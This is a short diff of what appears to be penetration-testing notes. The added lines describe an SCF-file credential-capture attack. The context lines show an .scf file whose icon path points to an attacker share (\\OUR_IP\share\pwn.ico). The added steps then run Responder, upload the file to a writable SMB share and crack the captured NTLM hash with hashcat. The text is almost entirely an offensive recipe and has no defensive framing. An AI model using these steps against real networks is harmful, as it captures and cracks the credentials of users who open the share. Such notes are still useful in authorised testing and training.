@@ -53,3 +53,9 @@
 #### IconFile=\\OUR_IP\share\pwn.ico
 #### [Taskbar]
 #### Command=ToggleDesktop
+
+#### 2) sudo responder -I INTERFACE (Start responder)
+
+#### 3) Upload the .scf file to a writebale SMB share
+
+#### 4) Crack the hash you captured with hashcat
